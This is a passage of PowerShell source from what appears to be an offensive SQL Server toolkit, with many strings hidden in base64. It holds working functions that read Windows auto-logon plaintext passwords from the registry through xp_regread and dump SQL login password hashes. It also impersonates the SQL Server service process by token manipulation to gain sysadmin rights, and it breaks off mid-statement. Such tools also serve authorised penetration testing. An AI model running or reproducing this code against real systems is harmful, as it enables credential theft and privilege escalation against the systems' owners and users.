        % -Process {
            $Instance = $_
            if($Instance.Split(',')[1])
            {
                $ComputerName = $Instance.Split(',')[0]
            }
            else
            {
                $ComputerName = $Instance.Split('\')[0]
            }
            if($_ -ne '')
            {
                $null = $TblFileInstances.Rows.Add($ComputerName,$Instance)
            }
        }
    }
    End
    {
        $FileInstanceCount = $TblFileInstances.rows.count
        Write-Verbose -Message "$FileInstanceCount instances where found in $FilePath."
        $TblFileInstances
    }
}
Function   Get-SQLRecoverPwAutoLogon
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblWinAutoCreds = New-Object -TypeName System.Data.DataTable
        $TblWinAutoCreds.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))) | Out-Null
        $TblWinAutoCreds.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) | Out-Null
        $TblWinAutoCreds.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) | Out-Null
        $TblWinAutoCreds.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA==')))) | Out-Null
        $TblWinAutoCreds.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))) | Out-Null
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }
        if($IsSysadmin -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }
        $DefaultQuery = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABXAGkAbgBkAG8AdwBzACAAQQB1AHQAbwAgAEwAbwBnAGkAbgAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAcgBvAG0AIAB0AGgAZQAgAFIAZQBnAGkAcwB0AHIAeQANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABBAHUAdABvAEwAbwBnAGkAbgAgAEQAZQBmAGEAdQBsAHQAIABEAG8AbQBhAGkAbgANAAoAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAEEAdQB0AG8ATABvAGcAaQBuAEQAbwBtAGEAaQBuACAAIABTAFkAUwBOAEEATQBFAA0ACgAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5AAkACQA9ACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAawBlAHkACQAJAAkAPQAgAE4AJwBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABXAGkAbgBsAG8AZwBvAG4AJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlAAkACQA9ACAATgAnAEQAZQBmAGEAdQBsAHQARABvAG0AYQBpAG4ATgBhAG0AZQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABBAHUAdABvAEwAbwBnAGkAbgBEAG8AbQBhAGkAbgAgAG8AdQB0AHAAdQB0AA0ACgANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAQQB1AHQAbwBMAG8AZwBpAG4AIABEAGUAZgBhAHUAbAB0AFUAcwBlAHIAbgBhAG0AZQANAAoAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAEEAdQB0AG8ATABvAGcAaQBuAFUAcwBlAHIAIAAgAFMAWQBTAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFACAAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIABAAHIAbwBvAHQAawBlAHkACQAJAD0AIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQABrAGUAeQAJAAkACQA9ACAATgAnAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQBfAG4AYQBtAGUACQAJAD0AIABOACcARABlAGYAYQB1AGwAdABVAHMAZQByAE4AYQBtAGUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUACQAJAAkAPQAgAEAAQQB1AHQAbwBMAG8AZwBpAG4AVQBzAGUAcgAgAG8AdQB0AHAAdQB0AA0ACgANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAQQB1AHQAbwBMAG8AZwBpAG4AIABEAGUAZgBhAHUAbAB0AFUAcwBlAHIAbgBhAG0AZQANAAoAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAEEAdQB0AG8ATABvAGcAaQBuAFAAYQBzAHMAdwBvAHIAZAAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVwBpAG4AbABvAGcAbwBuACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAF8AbgBhAG0AZQAJAAkAPQAgAE4AJwBEAGUAZgBhAHUAbAB0AFAAYQBzAHMAdwBvAHIAZAAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABBAHUAdABvAEwAbwBnAGkAbgBQAGEAcwBzAHcAbwByAGQAIABvAHUAdABwAHUAdAANAAoADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABEAGkAcwBwAGwAYQB5ACAAUgBlAHMAdQBsAHQAcwANAAoAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAARABvAG0AYQBpAG4AIAA9ACAAQABBAHUAdABvAEwAbwBnAGkAbgBEAG8AbQBhAGkAbgAsACAAVQBzAGUAcgBuAGEAbQBlACAAPQAgAEAAQQB1AHQAbwBMAG8AZwBpAG4AVQBzAGUAcgAsACAAUABhAHMAcwB3AG8AcgBkACAAPQAgAEAAQQB1AHQAbwBMAG8AZwBpAG4AUABhAHMAcwB3AG8AcgBkAA==')))
        $DefaultResults = Get-SQLQuery -Instance $Instance -Query $DefaultQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose     
        $DefaultUsername = $DefaultResults.Username
        if($DefaultUsername.length -ge 2){
            $DefaultResults | %{                
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }                    
        }else{
            Write-Verbose "$Instance : No default auto login credentials found."
        }
        $AltQuery = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABBAGwAdABlAHIAbgBhAHQAaQB2AGUAIABXAGkAbgBkAG8AdwBzACAAQQB1AHQAbwAgAEwAbwBnAGkAbgAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAcgBvAG0AIAB0AGgAZQAgAFIAZQBnAGkAcwB0AHIAeQANAAoAIAAgACAAIAAgACAAIAAgAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABBAGwAdAAgAEEAdQB0AG8ATABvAGcAaQBuACAARABlAGYAYQB1AGwAdAAgAEQAbwBtAGEAaQBuAA0ACgAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAgAEAAQQBsAHQAQQB1AHQAbwBMAG8AZwBpAG4ARABvAG0AYQBpAG4AIAAgAFMAWQBTAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFACAAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIABAAHIAbwBvAHQAawBlAHkACQAJAD0AIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQABrAGUAeQAJAAkACQA9ACAATgAnAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFcAaQBuAGwAbwBnAG8AbgAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQBfAG4AYQBtAGUACQAJAD0AIABOACcAQQBsAHQARABlAGYAYQB1AGwAdABEAG8AbQBhAGkAbgBOAGEAbQBlACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAAkACQAJAD0AIABAAEEAbAB0AEEAdQB0AG8ATABvAGcAaQBuAEQAbwBtAGEAaQBuACAAbwB1AHQAcAB1AHQADQAKAA0ACgAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABBAGwAdAAgAEEAdQB0AG8ATABvAGcAaQBuACAARABlAGYAYQB1AGwAdABVAHMAZQByAG4AYQBtAGUADQAKACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABBAGwAdABBAHUAdABvAEwAbwBnAGkAbgBVAHMAZQByACAAIABTAFkAUwBOAEEATQBFAA0ACgAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5AAkACQA9ACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAawBlAHkACQAJAAkAPQAgAE4AJwBTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABXAGkAbgBsAG8AZwBvAG4AJwAsAA0ACgAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlAAkACQA9ACAATgAnAEEAbAB0AEQAZQBmAGEAdQBsAHQAVQBzAGUAcgBOAGEAbQBlACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAAkACQAJAD0AIABAAEEAbAB0AEEAdQB0AG8ATABvAGcAaQBuAFUAcwBlAHIAIABvAHUAdABwAHUAdAANAAoADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAEEAbAB0ACAAQQB1AHQAbwBMAG8AZwBpAG4AIABEAGUAZgBhAHUAbAB0AFUAcwBlAHIAbgBhAG0AZQANAAoAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAEEAbAB0AEEAdQB0AG8ATABvAGcAaQBuAFAAYQBzAHMAdwBvAHIAZAAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVwBpAG4AbABvAGcAbwBuACcALAANAAoAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAF8AbgBhAG0AZQAJAAkAPQAgAE4AJwBBAGwAdABEAGUAZgBhAHUAbAB0AFAAYQBzAHMAdwBvAHIAZAAnACwADQAKACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABBAGwAdABBAHUAdABvAEwAbwBnAGkAbgBQAGEAcwBzAHcAbwByAGQAIABvAHUAdABwAHUAdAANAAoADQAKACAAIAAgACAAIAAgACAAIAAtAC0AIABEAGkAcwBwAGwAYQB5ACAAUgBlAHMAdQBsAHQAcwANAAoAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAARABvAG0AYQBpAG4AIAA9ACAAQABBAGwAdABBAHUAdABvAEwAbwBnAGkAbgBEAG8AbQBhAGkAbgAsACAAVQBzAGUAcgBuAGEAbQBlACAAPQAgAEAAQQBsAHQAQQB1AHQAbwBMAG8AZwBpAG4AVQBzAGUAcgAsACAAUABhAHMAcwB3AG8AcgBkACAAPQAgAEAAQQBsAHQAQQB1AHQAbwBMAG8AZwBpAG4AUABhAHMAcwB3AG8AcgBkAA==')))
        $AltResults = Get-SQLQuery -Instance $Instance -Query $AltQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $AltUsername = $AltResults.Username
        if($AltUsername.length -ge 2){                            
            $AltResults | %{               
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }
        }else{
            Write-Verbose "$Instance : No alternative auto login credentials found."
        }
    }
    End
    {
         $TblWinAutoCreds 
    }
}
Function Get-SQLServerPolicy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblPolicyInfo = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = " -- Get-SQLServerPolicy.sql 
                SELECT '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                    p.policy_id,
		            p.name as [PolicyName],
		            p.condition_id,
		            c.name as [ConditionName],
		            c.facet,
		            c.expression as [ConditionExpression],
		            p.root_condition_id,
		            p.is_enabled,
		            p.date_created,
		            p.date_modified,
		            p.description, 
		            p.created_by, 
		            p.is_system,
                    t.target_set_id,
                    t.TYPE,
                    t.type_skeleton
                FROM msdb.dbo.syspolicy_policies p
                INNER JOIN msdb.dbo.syspolicy_conditions c 
	                ON p.condition_id = c.condition_id
                INNER JOIN msdb.dbo.syspolicy_target_sets t
	                ON t.object_set_id = p.object_set_id"
        $TblPolicyInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblPolicyInfo = $TblPolicyInfo + $TblPolicyInfoTemp
    }
    End
    {
        $PolNum = $TblPolicyInfo.Count
        if($PolNum -eq 0){
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : No policies found."
            }
        }
        $TblPolicyInfo
    }
}
Function  Get-SQLServerPasswordHash
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name to filter for.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Migrate to SQL Server process.')]
        [switch]$Migrate,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblPasswordHashes = New-Object -TypeName System.Data.DataTable
        $null = $TblPasswordHashes.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblPasswordHashes.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblPasswordHashes.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAA=='))))
        $null = $TblPasswordHashes.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA='))))
        $null = $TblPasswordHashes.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAUwBpAGQA'))))
        $null = $TblPasswordHashes.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAVAB5AHAAZQA='))))
        $null = $TblPasswordHashes.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUARABhAHQAZQA='))))
        $null = $TblPasswordHashes.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdABEAGEAdABhAGIAYQBzAGUATgBhAG0AZQA='))))
        $null = $TblPasswordHashes.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAEgAYQBzAGgA'))))
        if($PrincipalName)
        {
            $PrincipalNameFilter = " and name like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }else{
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            if($Migrate)
            {
                $WinCurrentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().name
                $IsAdmin = Get-SQLLocalAdminCheck
                if($IsAdmin -ne $true){
                    write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
                        return
                }else{
                    write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
                }
                Write-Verbose -Message "$Instance : Impersonating SQL Server process:" 
                [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | ? {$_.ServicePath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHEAbABzAGUAcgB2AHIALgBlAHgAZQAqAA==')))} | select ServiceProcessId -ExpandProperty ServiceProcessId
                [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | ? {$_.ServicePath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHEAbABzAGUAcgB2AHIALgBlAHgAZQAqAA==')))} | select ServiceAccount -ExpandProperty ServiceAccount
                if ($TargetPid -eq 0){
                    Write-Verbose -Message "$Instance : No process running for provided instance..."
                    return
                }
                Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
                Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
                try{
                    ps | ? {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
                }catch{
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Impersonation failed."
                    Write-Verbose  -Message " $Instance : $ErrorMessage"
                    return
                }
            }else{            
                return
            }
        }            
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
        if($IsSysadmin -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {
            Write-Verbose -Message "$Instance : You are a sysadmin."
        }
        else
        {
            Write-Verbose -Message "$Instance : You are not a sysadmin."
            if($Migrate)
            {
                $WinCurrentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().name
                $IsAdmin = Get-SQLLocalAdminCheck
                if($IsAdmin -ne $true){
                    write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
                        return
                }else{
                    write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
                }
                 Write-Verbose -Message "$Instance : Impersonating SQL Server process:"  
                [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | ? {$_.ServicePath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHEAbABzAGUAcgB2AHIALgBlAHgAZQAqAA==')))} | select ServiceProcessId -ExpandProperty ServiceProcessId
                [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | ? {$_.ServicePath -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAHEAbABzAGUAcgB2AHIALgBlAHgAZQAqAA==')))} | select ServiceAccount -ExpandProperty ServiceAccount
                if ($TargetPid -eq 0){
                    Write-Verbose -Message "$Instance : No process running for provided instance..."
                    return
                }
                Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
                Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
                try{
                    ps | ? {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
                }catch{
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Impersonation failed."
                    Write-Verbose  -Message " $Instance : $ErrorMessage"
                    return
                }
            }else{
                return
            }
        }
        Write-Verbose -Message "$Instance : Attempting to dump password hashes."
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }
        if([int]$SQLVersionShort -le 8)
        {
            $Query = "USE master;
                SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
                name as [PrincipalName],
                createdate as [CreateDate],
			    dbname as [DefaultDatabaseName],
			    password as [PasswordHash]
                FROM [sysxlogins]"
        }
		else
        {
            $Query = "USE master;
                SELECT '$ComputerName' as [ComputerName],'$Instance' as [Instance],
                name as [PrincipalName],
			    principal_id as [PrincipalId],
			    type_desc as [PrincipalType],
                sid as [PrincipalSid],
                create_date as [CreateDate],
			    default_database_name as [DefaultDatabaseName],
			    [sys].fn_varbintohexstr(password_hash) as [PasswordHash]
                FROM [sys].[sql_logins]"
        }
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblResults |
        % -Process {
            $NewSid = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if ($NewSid.length -le 10)
            {
                $Sid = [Convert]::ToInt32($NewSid,16)
            }
            else
            {
                $Sid = $NewSid
            }
            $null = $TblPasswordHashes.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
